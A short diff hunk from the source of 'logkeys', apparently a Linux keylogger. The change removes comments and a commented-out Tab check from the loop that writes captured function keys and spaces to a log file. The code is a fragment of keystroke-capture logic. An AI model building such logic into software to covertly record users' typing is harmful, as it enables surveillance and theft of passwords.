@@ -478,16 +478,14 @@ namespace logkeys {
 					}
 				}
 				else if (is_func_key(scan_code)) {
-					if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
+					if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  
 						if (scan_code == 14){ // only want the delete from these keys
 							inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
 						}
 					} 
 
-					//NEED SPACE
-					if (scan_code == KEY_SPACE/* || scan_code == KEY_TAB*/) {
-						inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
-						//terminate_tree_branch();
+					if (scan_code == KEY_SPACE) {
+						inc_size += fprintf(out, " "); 
 					}
 				}
 			} // if (EV_MAKE)
